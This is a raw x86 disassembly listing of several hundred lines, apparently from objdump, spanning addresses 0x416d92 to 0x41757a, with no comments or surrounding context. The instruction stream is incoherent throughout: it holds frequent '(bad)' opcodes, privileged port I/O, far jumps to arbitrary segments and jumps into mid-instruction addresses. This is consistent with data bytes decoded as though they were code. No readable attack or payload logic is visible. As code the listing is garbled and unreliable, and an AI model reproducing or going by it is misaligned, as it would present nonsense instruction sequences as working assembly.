  416d92:	test   al,0x54
  416d94:	inc    eax
  416d95:	bound  edx,QWORD PTR [ebx]
  416d97:	adc    BYTE PTR [edi+0x26],al
  416d9a:	rcr    BYTE PTR [edi-0x88095],0x43
  416da1:	and    ch,BYTE PTR [ebx]
  416da3:	add    DWORD PTR [ecx],edx
  416da5:	test   DWORD PTR [ecx-0x298e8ea3],ecx
  416dab:	sbb    al,BYTE PTR [ecx+0x19]
  416dae:	popf   
  416daf:	xor    ch,bl
  416db1:	cli    
  416db2:	push   0x98fe40a5
  416db7:	sbb    al,0xbc
  416db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dba:	fs mov al,0xd4
  416dbd:	xor    BYTE PTR [edx],0xfa
  416dc0:	mov    cl,0xe6
  416dc2:	scas   al,BYTE PTR es:[edi]
  416dc3:	shr    ch,1
  416dc5:	les    ebx,FWORD PTR [ecx]
  416dc7:	xor    DWORD PTR [eax+0x4a],0x39
  416dcb:	cmp    ecx,ecx
  416dcd:	xchg   ebx,eax
  416dce:	retf   0x87aa
  416dd1:	xlat   BYTE PTR ds:[ebx]
  416dd2:	push   ebx
  416dd3:	(bad)  [edi+0x4a]
  416dd6:	lock lock sbb eax,0x39fd11ca
  416ddd:	adc    DWORD PTR [edx+0xa209284],0x76
  416de4:	je     0x416e07
  416de6:	xor    BYTE PTR [esp+ebp*4-0x45],ah
  416dea:	fild   WORD PTR [eax-0x6628f319]
  416df0:	out    dx,al
  416df1:	xchg   al,bl
  416df3:	repnz test BYTE PTR [esi+0x2535ea80],0x92
  416dfb:	das    
  416dfc:	inc    eax
  416dfd:	jne    0x416e17
  416dff:	push   esi
  416e00:	in     al,dx
  416e01:	mov    dl,0x27
  416e03:	push   ebx
  416e04:	push   ss
  416e05:	cmc    
  416e06:	mov    bh,0xfa
  416e08:	inc    ebp
  416e09:	mov    cl,0x21
  416e0b:	jns    0x416e16
  416e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e0e:	dec    edi
  416e0f:	mov    edi,0xfce8e682
  416e14:	pop    ds
  416e15:	shl    BYTE PTR [edx+ebx*1],1
  416e18:	pop    eax
  416e19:	xor    ch,BYTE PTR [ecx+edx*8]
  416e1c:	pop    eax
  416e1d:	mov    ah,0x75
  416e1f:	push   ebx
  416e20:	and    BYTE PTR [ebx+0x8ae2510],0x7c
  416e27:	adc    al,0x45
  416e29:	aam    0x9f
  416e2b:	push   ss
  416e2c:	repz mov cl,0xf3
  416e2f:	js     0x416e6d
  416e31:	push   0x78109665
  416e36:	add    DWORD PTR [edx+0x4e],esp
  416e39:	xlat   BYTE PTR ds:[ebx]
  416e3a:	out    dx,eax
  416e3b:	or     DWORD PTR [eax-0x19],0x70
  416e3f:	push   0xfb60af32
  416e44:	push   edx
  416e45:	mov    BYTE PTR [ebp-0x19],ch
  416e48:	jle    0x416e6f
  416e4a:	mov    dh,0x80
  416e4c:	pusha  
  416e4d:	jo     0x416dea
  416e4f:	test   al,0x3d
  416e51:	out    0x28,eax
  416e53:	sub    ah,ch
  416e55:	or     dl,BYTE PTR [ebx+0x2]
  416e58:	mov    cs,WORD PTR [ebx-0x7496c99a]
  416e5e:	jnp    0xcb425067
  416e64:	jl     0x416e13
  416e66:	xor    DWORD PTR [eax+0x1e8cf364],esp
  416e6c:	and    eax,0xc9b361ee
  416e71:	sbb    DWORD PTR [ebx],0xffffffff
  416e74:	mov    DWORD PTR [ebx*4+0x7cad3be0],0x1690f850
  416e7f:	adc    ah,BYTE PTR [edi]
  416e81:	add    BYTE PTR [edx],bl
  416e83:	dec    edx
  416e84:	ins    BYTE PTR es:[edi],dx
  416e85:	mov    cl,0x4e
  416e87:	cmp    BYTE PTR [eax+0x35052039],0x2e
  416e8e:	fs inc esi
  416e90:	mov    esi,0x95ffc1dd
  416e95:	dec    ecx
  416e96:	imul   esp,ecx,0xfe34ce55
  416e9c:	mov    BYTE PTR [eax+0x408d714d],bh
  416ea2:	mul    DWORD PTR [esi]
  416ea4:	stos   DWORD PTR es:[edi],eax
  416ea5:	push   ebp
  416ea6:	sbb    al,0xc8
  416ea8:	lods   eax,DWORD PTR ds:[esi]
  416ea9:	pop    edi
  416eaa:	ins    BYTE PTR es:[edi],dx
  416eab:	(bad)  
  416eac:	and    BYTE PTR [edi-0x7b99ed6c],bl
  416eb2:	sub    BYTE PTR [edx-0x71],0x2e
  416eb6:	xchg   ebx,eax
  416eb7:	cld    
  416eb8:	adc    BYTE PTR [ecx],cl
  416eba:	scas   eax,DWORD PTR es:[edi]
  416ebb:	inc    ebp
  416ebc:	xchg   esi,eax
  416ebd:	out    dx,al
  416ebe:	dec    DWORD PTR [edi-0x5dcd4e23]
  416ec4:	frstor [esi]
  416ec6:	and    BYTE PTR [edx-0x5e],cl
  416ec9:	int    0x77
  416ecb:	mov    al,ds:0x17f3e8d2
  416ed0:	sbb    DWORD PTR [ebp+0x71],0xffffffab
  416ed4:	jg     0x416ec0
  416ed6:	pop    ebp
  416ed7:	arpl   ax,sp
  416ed9:	loope  0x416e85
  416edb:	sub    al,0xf2
  416edd:	push   es
  416ede:	stc    
  416edf:	push   cs
  416ee0:	adc    ch,dl
  416ee2:	cli    
  416ee3:	pop    ebp
  416ee4:	outs   dx,BYTE PTR ds:[esi]
  416ee5:	push   ds
  416ee6:	pop    esi
  416ee7:	clc    
  416ee8:	sbb    al,0xb8
  416eea:	mov    ds:0x14ad19b9,al
  416eef:	dec    ebx
  416ef0:	das    
  416ef1:	int3   
  416ef2:	leave  
  416ef3:	jmp    0x317a7bc1
  416ef8:	add    eax,0xe54114e7
  416efd:	mov    ebx,0x7cf3dc68
  416f02:	dec    edi
  416f03:	sbb    eax,0x1c4957f8
  416f08:	stc    
  416f09:	rcr    BYTE PTR [edi],cl
  416f0b:	sub    al,0x3c
  416f0e:	inc    ebp
  416f0f:	outs   dx,DWORD PTR ds:[esi]
  416f10:	lea    esi,[edi-0x1c]
  416f13:	ins    DWORD PTR es:[edi],dx
  416f14:	mov    esi,0x4ffe02ec
  416f19:	outs   dx,DWORD PTR ds:[esi]
  416f1a:	lahf   
  416f1b:	cmp    eax,DWORD PTR [edx+esi*2]
  416f1e:	mov    bh,0xe
  416f20:	lods   eax,DWORD PTR ds:[esi]
  416f21:	jmp    0x416ebb
  416f23:	jnp    0x416f69
  416f25:	add    BYTE PTR [esi-0xf],ch
  416f28:	push   ss
  416f29:	dec    ecx
  416f2a:	mov    edi,0xacc6ba17
  416f2f:	dec    edx
  416f30:	cmp    BYTE PTR [edi+0x296ba5ad],bh
  416f36:	xor    ch,bl
  416f38:	adc    bh,BYTE PTR [eax]
  416f3a:	jnp    0x416f02
  416f3c:	cmp    eax,0x76b828c7
  416f41:	cmp    ah,BYTE PTR [ecx]
  416f43:	add    ah,BYTE PTR [edi-0x77233f71]
  416f49:	and    eax,0xe9a356b7
  416f4e:	xor    al,0xe9
  416f50:	mov    al,ds:0xf0c5f6ee
  416f55:	pop    ebp
  416f56:	std    
  416f57:	xor    DWORD PTR [edi+esi*8-0xbab7dae],ebx
  416f5e:	jecxz  0x416f1a
  416f60:	push   0xdad882c
  416f65:	pop    ss
  416f66:	jb     0x416f1c
  416f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f69:	xchg   esi,eax
  416f6a:	jp     0x416f23
  416f6c:	loop   0x416f2c
  416f6e:	mov    ebp,0x71bccab
  416f73:	jp     0x416f46
  416f75:	add    DWORD PTR [ebx+0x2b632a03],0x58
  416f7c:	and    BYTE PTR [edx],dh
  416f7e:	sahf   
  416f7f:	mov    edx,0x6b2f16a3
  416f84:	lock scas al,BYTE PTR es:[edi]
  416f86:	adc    ah,BYTE PTR [edi+0x68]
  416f89:	cmp    BYTE PTR [ecx],ah
  416f8b:	ins    DWORD PTR es:[edi],dx
  416f8c:	(bad)  [esi-0x29]
  416f8f:	stc    
  416f90:	sub    eax,0x3dde8b32
  416f95:	fwait
  416f96:	shr    DWORD PTR [ebp+0x3c849ea1],0x37
  416f9d:	div    al
  416f9f:	jecxz  0x416f94
  416fa1:	mov    ebx,eax
  416fa3:	push   eax
  416fa4:	dec    eax
  416fa5:	cmc    
  416fa6:	pop    ebx
  416fa7:	inc    eax
  416fa8:	xor    ecx,0x6069e19d
  416fae:	mov    esp,0x7ac1df24
  416fb3:	adc    edi,DWORD PTR [edi]
  416fb5:	mov    esp,DWORD PTR [ecx+0x56]
  416fb8:	pop    ss
  416fb9:	or     BYTE PTR [ebp+0x18281323],0xb7
  416fc0:	add    eax,0x3e4ea9db
  416fc5:	popf   
  416fc6:	fisub  WORD PTR [esi+esi*2+0x0]
  416fca:	daa    
  416fcb:	pop    ebp
  416fcc:	and    cl,BYTE PTR [eax]
  416fce:	scas   al,BYTE PTR es:[edi]
  416fcf:	repnz push 0xffffffe4
  416fd2:	mov    ch,0xe1
  416fd4:	inc    ecx
  416fd5:	mov    DWORD PTR [ecx],ebp
  416fd7:	fs push esi
  416fd9:	push   ebp
  416fda:	aam    0xed
  416fdc:	test   DWORD PTR [esp+esi*8],eax
  416fdf:	sahf   
  416fe0:	test   DWORD PTR [edx-0x34],esi
  416fe3:	push   DWORD PTR [eax-0x68f38757]
  416fe9:	or     DWORD PTR [ecx-0x7d19bda6],eax
  416fef:	mov    dh,0x84
  416ff1:	in     eax,dx
  416ff2:	sbb    BYTE PTR [esi-0x46],ch
  416ff5:	(bad)
  416ff8:	mov    ecx,0x7cad1af
  416ffd:	ret    0x53df
  417000:	cwde   
  417001:	es aaa 
  417003:	dec    ebp
  417004:	and    eax,0x311287c9
  417009:	test   eax,0xc989e8ba
  41700e:	popf   
  41700f:	call   DWORD PTR [edx]
  417011:	mov    dl,0x4f
  417013:	sub    BYTE PTR [edx-0x6d],al
  417016:	inc    edi
  417017:	inc    BYTE PTR [esi]
  417019:	mov    dh,0x94
  41701b:	xor    al,0x22
  41701d:	shl    BYTE PTR [ebx],0xbe
  417020:	fistp  WORD PTR [esi-0x2a]
  417023:	imul   ecx,DWORD PTR [ebx],0xb3a0ed4e
  417029:	push   0xffffff8c
  41702b:	jbe    0x417051
  41702d:	(bad)  
  41702e:	test   eax,0xc9965acf
  417033:	(bad)  
  417034:	jmp    0x4170a6
  417036:	shr    DWORD PTR [eax+ebp*1-0xd0409fe],1
  41703d:	jle    0x41706a
  41703f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417040:	xlat   BYTE PTR ds:[ebx]
  417041:	xor    DWORD PTR [ecx+edx*1+0x59aa6db3],esi
  417048:	scas   al,BYTE PTR es:[edi]
  417049:	add    al,0x28
  41704b:	mov    al,ds:0xcb3581ca
  417050:	push   edi
  417051:	xchg   esi,eax
  417052:	cmp    BYTE PTR [edi+0x7b7a7da],0x8c
  417059:	xor    eax,0xbffcb8b3
  41705e:	mov    ah,0xbe
  417060:	xor    ah,dh
  417062:	jg     0x417087
  417064:	sub    ebp,DWORD PTR [edx]
  417066:	xchg   ecx,eax
  417067:	inc    eax
  417068:	pop    ebx
  417069:	div    ecx
  41706b:	dec    ebp
  41706c:	adc    al,ah
  41706e:	jno    0x4170ac
  417070:	out    dx,al
  417071:	sbb    edi,DWORD PTR [edx]
  417073:	loopne 0x41706c
  417075:	repnz out 0x47,eax
  417078:	addr16 pop ebp
  41707a:	xchg   ecx,eax
  41707b:	push   ss
  41707c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41707d:	sbb    ah,BYTE PTR [eax-0x5b6d2aef]
  417083:	sub    eax,0x1dc8e035
  417088:	sahf   
  417089:	ror    dh,1
  41708b:	sub    eax,0x803facd
  417090:	stos   BYTE PTR es:[edi],al
  417091:	(bad)  
  417092:	jb     0x417113
  417094:	inc    ecx
  417095:	lock adc eax,0xabeaf626
  41709b:	adc    DWORD PTR [ebx+eax*4-0x608e2c39],edi
  4170a2:	cmp    ecx,edx
  4170a4:	cmp    dh,dl
  4170a6:	push   eax
  4170a7:	iret   
  4170a8:	not    ebp
  4170aa:	mov    bl,0x8
  4170ac:	retf   0x36c2
  4170af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170b0:	mov    ebx,0x4e8619ea
  4170b5:	mov    ah,0x20
  4170b7:	mov    edi,0x3c03529d
  4170bc:	(bad)  
  4170bd:	sbb    bh,BYTE PTR [ecx]
  4170bf:	out    dx,al
  4170c0:	packsswb mm5,mm1
  4170c3:	mov    edx,0x86bb6915
  4170c8:	and    dh,BYTE PTR [eax+0x33]
  4170cb:	push   esp
  4170cc:	sbb    ah,0xda
  4170cf:	cwde   
  4170d0:	or     al,0x91
  4170d2:	fld    QWORD PTR [eax+0x59]
  4170d5:	jb     0x417145
  4170d7:	jbe    0x4170c1
  4170d9:	repnz xor DWORD PTR [ecx-0x3d70f363],edx
  4170e0:	fst    QWORD PTR [ebx-0x34]
  4170e3:	xchg   BYTE PTR [ebp-0x12],ah
  4170e6:	retf   
  4170e7:	shl    ecx,1
  4170e9:	pop    ecx
  4170ea:	mov    ds:0x2ea4a872,al
  4170ef:	push   0x1e11d237
  4170f4:	mov    ch,0x5
  4170f6:	push   esi
  4170f7:	mov    cl,0x3b
  4170f9:	outs   dx,DWORD PTR ds:[esi]
  4170fa:	jmp    0x5106:0x13c5c4da
  417101:	jo     0x4170a9
  417103:	push   edi
  417104:	les    eax,FWORD PTR [edx]
  417106:	push   ebx
  417107:	pop    ecx
  417108:	stos   BYTE PTR es:[edi],al
  417109:	ret    0xb9a1
  41710c:	mov    edx,0x6b9f16e
  417111:	add    DWORD PTR [eax+0x11],0xffffff83
  417115:	adc    bh,BYTE PTR [eax]
  417117:	mov    edi,0x13075b78
  41711c:	test   BYTE PTR [edx],bh
  41711e:	test   eax,0x48523794
  417123:	(bad)  
  417124:	(bad)  
  417125:	hlt    
  417126:	xchg   edi,eax
  417127:	rcl    DWORD PTR [eax],0x9d
  41712a:	sub    BYTE PTR [esi+0x5cc5f6ec],cl
  417130:	in     al,dx
  417131:	mov    ds:0x9cd62deb,eax
  417136:	fistp  WORD PTR [edx+eiz*2]
  417139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41713a:	dec    edi
  41713b:	sbb    al,0x36
  41713d:	pop    ecx
  41713e:	sub    DWORD PTR [esi],ebp
  417140:	hlt    
  417141:	outs   dx,BYTE PTR ds:[esi]
  417142:	sbb    BYTE PTR [esi-0x16],bh
  417145:	ins    DWORD PTR es:[edi],dx
  417146:	sbb    eax,0xcf9ae6b5
  41714b:	arpl   WORD PTR [ebp-0x1e],di
  41714e:	scas   al,BYTE PTR es:[edi]
  41714f:	stos   DWORD PTR es:[edi],eax
  417150:	repz push edx
  417152:	jmp    0x4171ad
  417154:	dec    ebx
  417155:	mov    eax,0xdb56f607
  41715a:	not    DWORD PTR [eax]
  41715c:	(bad)  
  41715d:	pop    edx
  41715e:	xchg   BYTE PTR [ecx+0x23],ch
  417161:	cld    
  417162:	pushf  
  417163:	(bad)  
  417164:	clc    
  417165:	dec    edx
  417166:	ror    DWORD PTR [ecx-0x14],cl
  417169:	sub    ebx,esp
  41716b:	mov    edi,0x3bbf07f5
  417170:	xchg   ebp,eax
  417171:	retf   
  417172:	fnsave [ebx+0x249169c9]
  417178:	shr    BYTE PTR [eax+0x18f8b954],1
  41717e:	inc    ecx
  41717f:	xchg   edi,eax
  417180:	jecxz  0x417170
  417182:	outs   dx,BYTE PTR ds:[esi]
  417183:	jmp    0x4171f1
  417185:	cld    
  417186:	and    edx,DWORD PTR [ebp+0x2dbecee0]
  41718c:	test   eax,0x6dba92c0
  417191:	sbb    eax,0x872675db
  417196:	cwde   
  417197:	pop    eax
  417198:	in     al,dx
  417199:	inc    eax
  41719a:	jo     0x417135
  41719c:	sub    bh,BYTE PTR [ecx+0x559cd498]
  4171a2:	mov    al,0x62
  4171a4:	imul   eax,DWORD PTR [edx-0x5e],0x1f549222
  4171ab:	imul   ebp,DWORD PTR [ebx-0x54e58a62],0x3a
  4171b2:	jnp    0x41717d
  4171b4:	pop    esp
  4171b5:	sub    dl,BYTE PTR [edi+0x5a8f60b2]
  4171bb:	jmp    0x6ccd90bc
  4171c0:	scas   al,BYTE PTR es:[edi]
  4171c1:	enter  0x9d2,0x79
  4171c5:	cmp    dh,bl
  4171c7:	mov    cl,0xbe
  4171c9:	jp     0x4171dd
  4171cb:	mov    edx,0xf0bb88e6
  4171d0:	sbb    ebp,DWORD PTR [edi-0x30000684]
  4171d6:	jmp    0x583f:0xe4554f6b
  4171dd:	mov    ecx,0x18a5d1d8
  4171e2:	aas    
  4171e3:	(bad)  [edi+0x56ba17e6]
  4171e9:	outs   dx,BYTE PTR ds:[esi]
  4171ea:	outs   dx,BYTE PTR ds:[esi]
  4171eb:	gs inc edi
  4171ed:	dec    eax
  4171ee:	xor    al,BYTE PTR ds:0x9c75a307
  4171f4:	or     esp,DWORD PTR [ecx-0x60616653]
  4171fa:	pusha  
  4171fb:	cmp    DWORD PTR [ecx+0x6f],esp
  4171fe:	mov    al,0x90
  417200:	sar    BYTE PTR ds:0x87dcad7,1
  417206:	jle    0x417207
  417208:	stos   BYTE PTR es:[edi],al
  417209:	call   DWORD PTR [ebx]
  41720b:	xchg   ecx,eax
  41720c:	xchg   esi,eax
  41720d:	dec    esp
  41720e:	adc    eax,0x1b219854
  417213:	paddw  mm2,mm2
  417216:	pop    esp
  417217:	jle    0x41727b
  417219:	mov    bl,0xd1
  41721b:	outs   dx,BYTE PTR ds:[esi]
  41721c:	stos   BYTE PTR es:[edi],al
  41721d:	sahf   
  41721e:	and    BYTE PTR [esi+0x14],ah
  417221:	fdiv   QWORD PTR [ecx-0x5a2ca014]
  417227:	cmp    esp,esi
  417229:	add    dh,BYTE PTR [eax]
  41722b:	ret    
  41722c:	cmp    al,0x68
  41722e:	sbb    eax,0x60781aa9
  417233:	imul   dl
  417235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417236:	or     BYTE PTR [ecx],dl
  417238:	adc    eax,0x25f09d2a
  41723d:	test   BYTE PTR [eax],bh
  41723f:	pop    ebx
  417240:	cmp    al,dh
  417242:	jno    0x4171f8
  417244:	sub    ecx,DWORD PTR [edx+0x54]
  417247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417248:	add    eax,0xafebd7db
  41724d:	inc    ecx
  41724e:	sbb    al,0x33
  417250:	fmul   QWORD PTR es:[esi+eiz*4+0x3055e2f0]
  417258:	int    0x5b
  41725a:	pop    ecx
  41725b:	jb     0x417275
  41725d:	sbb    eax,0xb54e165a
  417262:	add    ebx,DWORD PTR [ecx-0x16]
  417265:	or     eax,0xef2806de
  41726a:	jnp    0x417234
  41726c:	cmp    DWORD PTR [ecx],esp
  41726e:	xor    edx,ebp
  417270:	and    ah,BYTE PTR [edi-0x1]
  417273:	rol    BYTE PTR [ebx],1
  417275:	dec    edi
  417276:	adc    BYTE PTR [edi-0x17],dl
  417279:	sub    eax,DWORD PTR [esi-0x58]
  41727c:	cmp    ebp,DWORD PTR [ecx+eiz*1]
  41727f:	in     al,0xc3
  417281:	sub    BYTE PTR [esi+esi*2],dh
  417284:	lock sar bh,1
  417287:	gs sti 
  417289:	jmp    0xb415:0xbd0afa13
  417290:	mov    dh,0xc8
  417292:	mov    BYTE PTR [ebp+0x2346e41b],ah
  417298:	mov    esi,0xca832b9c
  41729d:	dec    eax
  41729e:	arpl   WORD PTR [eax+0x3bc87a1f],cx
  4172a4:	jl     0x41726b
  4172a6:	pop    edx
  4172a7:	sub    bh,BYTE PTR [ecx+eiz*8-0x790cbad]
  4172ae:	popf   
  4172af:	dec    ebx
  4172b0:	in     al,0xb6
  4172b2:	cmp    eax,0xdd5f79e
  4172b7:	fmul   DWORD PTR [edi-0x64fc7494]
  4172bd:	ficom  WORD PTR [edx+0x60]
  4172c0:	cmp    eax,0x5880f0b3
  4172c5:	xchg   esp,eax
  4172c6:	cmp    ebx,DWORD PTR [ecx-0x27]
  4172c9:	mov    esp,0xd111c788
  4172ce:	mov    esi,0x65dcbf36
  4172d3:	or     al,0x12
  4172d5:	cmp    eax,0xa9503457
  4172da:	mov    dh,0x40
  4172dc:	pop    edi
  4172dd:	int3   
  4172de:	dec    edi
  4172df:	sahf   
  4172e0:	or     BYTE PTR ds:0xbf277758,ah
  4172e6:	mov    bl,0xbb
  4172e8:	out    0x20,eax
  4172ea:	shl    DWORD PTR [edi-0x15],0x4
  4172ee:	push   ebp
  4172ef:	sahf   
  4172f0:	jmp    0x607d723e
  4172f5:	shl    ebp,1
  4172f7:	jno    0x417322
  4172f9:	pop    esi
  4172fa:	sub    ch,BYTE PTR [esi+eax*4-0x2cc7b285]
  417301:	jo     0x41732b
  417303:	bound  ebp,QWORD PTR [edi-0x29db8290]
  417309:	test   bl,0xee
  41730c:	xchg   esi,eax
  41730d:	adc    bh,dl
  41730f:	xchg   ecx,eax
  417310:	mov    ebx,0x433b886e
  417315:	mov    eax,0xc81716d5
  41731a:	xor    BYTE PTR [edi],dl
  41731c:	jp     0x41734f
  41731e:	inc    eax
  41731f:	ss stos DWORD PTR es:[edi],eax
  417321:	mov    ch,0x53
  417323:	sub    al,0xe1
  417325:	ret    0xbaee
  417328:	jns    0x417345
  41732a:	retf   0x6d58
  41732d:	sub    esi,DWORD PTR [esi]
  41732f:	inc    ecx
  417330:	jmp    0x417350
  417332:	std    
  417333:	jae    0x4172b7
  417335:	xchg   esi,eax
  417336:	loopne 0x4172d7
  417338:	inc    edi
  417339:	mov    WORD PTR [edx+ebp*8+0x27bbf39b],cs
  417340:	leave  
  417341:	adc    ah,BYTE PTR [eax-0x58fe637a]
  417347:	outs   dx,DWORD PTR ds:[esi]
  417348:	out    dx,eax
  417349:	bound  esi,QWORD PTR [eax-0x4e45edbe]
  41734f:	cdq    
  417350:	push   eax
  417351:	cld    
  417352:	sub    DWORD PTR [edx],eax
  417354:	jl     0x4173b2
  417356:	xchg   edi,ecx
  417358:	and    al,0x9
  41735a:	retf   
  41735b:	cld    
  41735c:	repz es mov bl,0xaf
  417360:	jns    0x4173c6
  417362:	daa    
  417363:	int    0x3e
  417365:	inc    ecx
  417366:	call   0x2c6f:0xb5428d4f
  41736d:	imul   edi,DWORD PTR [ecx+eiz*1+0x7ba95752],0x22
  417375:	sbb    dh,ch
  417377:	pop    ebx
  417378:	fwait
  417379:	lock inc eax
  41737b:	xor    dh,BYTE PTR [ecx+0x6dda6d62]
  417381:	out    0xa1,al
  417383:	or     ch,BYTE PTR [edx]
  417385:	cmp    al,0xaa
  417387:	fimul  WORD PTR [ebx-0x11]
  41738a:	and    edi,ecx
  41738c:	xchg   esi,eax
  41738d:	and    dl,BYTE PTR [ecx-0x11]
  417390:	xor    edi,edx
  417392:	fisub  DWORD PTR [ebx-0x4c]
  417395:	pop    ebp
  417396:	mov    al,dh
  417398:	cli    
  417399:	sbb    al,0x44
  41739b:	pop    esi
  41739c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41739d:	inc    edi
  41739e:	out    dx,eax
  41739f:	or     DWORD PTR [edx*8-0x37fb71ce],esp
  4173a6:	shr    DWORD PTR ds:0xcb0e2cfe,cl
  4173ac:	mov    edi,0x1d327927
  4173b1:	jb     0x41739e
  4173b3:	rcl    bh,0x84
  4173b6:	dec    ecx
  4173b7:	mov    cs,esp
  4173b9:	mov    WORD PTR [ebx-0x52],?
  4173bc:	sub    al,0x3d
  4173be:	ds sbb al,0x7d
  4173c1:	jbe    0x41735d
  4173c3:	and    eax,0x3d69bd22
  4173c8:	and    eax,0x34ee579c
  4173cd:	fbld   TBYTE PTR [ebx+0x62]
  4173d0:	xchg   ebp,eax
  4173d1:	adc    al,0xcf
  4173d3:	popa   
  4173d4:	add    BYTE PTR [edi+0x3f],bl
  4173d7:	mov    edi,0xe7b0ea71
  4173dc:	mov    ch,al
  4173de:	cmp    esi,DWORD PTR [ebx]
  4173e0:	or     eax,DWORD PTR [esi]
  4173e2:	jns    0x41743f
  4173e4:	jns    0x41743f
  4173e6:	data16 lods al,BYTE PTR ds:[esi]
  4173e8:	cmc    
  4173e9:	jg     0x417390
  4173eb:	das    
  4173ec:	push   0x56
  4173ee:	mov    dl,dh
  4173f0:	fdivr  st,st(0)
  4173f2:	clc    
  4173f3:	stc    
  4173f4:	and    BYTE PTR [edx-0x5afafbd0],dh
  4173fa:	and    cl,dh
  4173fc:	xor    eax,0xab3bf50
  417401:	cmp    eax,esi
  417403:	lock cli 
  417405:	cmp    edi,DWORD PTR [edi]
  417407:	xor    ch,BYTE PTR [ecx]
  417409:	ja     0x4173b7
  41740b:	daa    
  41740c:	aam    0x6a
  41740e:	enter  0x1fa0,0xd7
  417412:	xchg   esi,eax
  417413:	ins    BYTE PTR es:[edi],dx
  417414:	mov    dh,0xb7
  417416:	push   ss
  417417:	ja     0x4173f4
  417419:	adc    eax,0x60c3ceab
  41741e:	lock jmp 0x7263:0x416bd088
  417426:	repz loopne 0x4174a3
  417429:	mov    ch,0x12
  41742b:	ins    DWORD PTR es:[edi],dx
  41742c:	mov    ebp,0xd1bd8e08
  417431:	pop    edi
  417432:	mov    ss,WORD PTR [ecx]
  417434:	ret    0x35cd
  417437:	and    DWORD PTR [edx-0x5d],eax
  41743a:	call   0xf022:0x32347be8
  417441:	cli    
  417442:	mov    ch,0xdd
  417444:	inc    edx
  417445:	test   ah,0x9d
  417448:	ins    BYTE PTR es:[edi],dx
  417449:	shl    ebp,0xb
  41744c:	xor    eax,0x923fdf63
  417451:	push   ebp
  417452:	cmp    eax,DWORD PTR [eax+0x54]
  417455:	mov    al,ds:0xc96a4e61
  41745a:	outs   dx,DWORD PTR ds:[esi]
  41745b:	lods   eax,DWORD PTR ds:[esi]
  41745c:	inc    ebp
  41745d:	dec    edi
  41745e:	cdq    
  41745f:	sub    ch,al
  417461:	haddpd xmm4,XMMWORD PTR [esi+0x1e]
  417466:	jmp    0x9bd356db
  41746b:	shl    ecx,cl
  41746d:	inc    esi
  41746e:	and    ecx,esi
  417470:	push   ds
  417471:	cmp    eax,0x95e3af72
  417476:	mov    al,0xe5
  417478:	dec    ecx
  417479:	jno    0x41742d
  41747b:	add    eax,0xa77464a6
  417480:	mov    bl,0x93
  417482:	fidiv  DWORD PTR [esi-0x74]
  417485:	(bad)  
  417486:	aam    0x7a
  417488:	mov    edi,0x39b6aae3
  41748d:	xor    al,BYTE PTR [ecx]
  41748f:	int    0xfb
  417491:	jo     0x4174f8
  417493:	cwde   
  417494:	mov    ebp,DWORD PTR [ebx+0x4be41c9a]
  41749a:	cmp    dl,BYTE PTR [eax+eax*8-0xb1f7c78]
  4174a1:	and    BYTE PTR [ecx-0x78],ah
  4174a4:	scas   al,BYTE PTR es:[edi]
  4174a5:	test   DWORD PTR [ecx-0x2d],esp
  4174a8:	rol    BYTE PTR [edi-0x62],0xf6
  4174ac:	retf   0x311d
  4174af:	inc    ebx
  4174b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174b1:	mov    bl,0xe8
  4174b3:	into   
  4174b4:	mov    BYTE PTR [edx],al
  4174b6:	je     0x417474
  4174b8:	lds    ebp,FWORD PTR ss:[ebx]
  4174bb:	mov    edi,0xbbb45e25
  4174c0:	xor    ebp,0xffffffca
  4174c3:	call   0x60538c80
  4174c8:	cld    
  4174c9:	shr    DWORD PTR cs:[esi-0x3bd002cd],1
  4174d0:	js     0x417522
  4174d2:	sub    al,0xa3
  4174d4:	fnsave [esi+0x71092639]
  4174da:	mov    bl,0xdb
  4174dc:	out    0x3f,eax
  4174de:	scas   al,BYTE PTR es:[edi]
  4174df:	dec    edx
  4174e0:	xor    eax,DWORD PTR [eax+eax*4]
  4174e3:	(bad)  
  4174e4:	xchg   ebp,eax
  4174e5:	push   esp
  4174e6:	and    DWORD PTR [ecx+0x31ef7599],ecx
  4174ec:	add    BYTE PTR [ecx-0x1641e0c8],0xb0
  4174f3:	pushf  
  4174f4:	jns    0x4174b5
  4174f6:	in     al,dx
  4174f7:	(bad)  
  4174f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174f9:	sar    DWORD PTR [eax+ebx*8+0x5b],1
  4174fd:	xor    ch,ah
  4174ff:	ja     0x417527
  417501:	mov    edx,0x31f2532c
  417506:	repz frstor [eax]
  417509:	mov    ds:0xe58f34da,al
  41750e:	gs pop ecx
  417510:	mov    ebx,0x50e77fc4
  417515:	pop    esp
  417516:	push   ecx
  417517:	jle    0x4174ad
  417519:	jb     0x417546
  41751b:	out    dx,eax
  41751c:	call   0x8111477e
  417521:	jmp    0x85feca50
  417526:	fwait
  417527:	inc    esp
  417528:	gs scas eax,DWORD PTR es:[edi]
  41752a:	or     eax,ebp
  41752c:	mov    BYTE PTR [esi+0x71],ch
  41752f:	add    BYTE PTR [ebx+0x61eafc25],0x77
  417536:	and    eax,0x9b8cd4ac
  41753b:	int3   
  41753c:	pop    ecx
  41753d:	xchg   ebx,eax
  41753e:	ret    
  41753f:	fild   WORD PTR [bx+di-0x1e]
  417543:	mov    al,ds:0x97140207
  417548:	ss mov edi,0x6e7188cc
  41754e:	(bad)  
  41754f:	arpl   di,sp
  417551:	cmp    eax,0x1e5d9a95
  417556:	mov    cs,esp
  417558:	cmp    esi,ebp
  41755a:	aas    
  41755b:	xor    eax,0x8aac8696
  417560:	ja     0x417594
  417562:	mov    ?,edx
  417564:	dec    esp
  417565:	inc    edx
  417566:	outs   dx,DWORD PTR ds:[esi]
  417567:	fbld   TBYTE PTR [edx-0x65]
  41756a:	bnd js 0x41759f
  41756d:	(bad)  
  41756f:	inc    ecx
  417570:	pop    edx
  417571:	push   esp
  417572:	dec    ebx
  417573:	mov    ds:0xa947482,al
  417578:	mov    cl,0xf2
  41757a:	mov    ah,0x1d
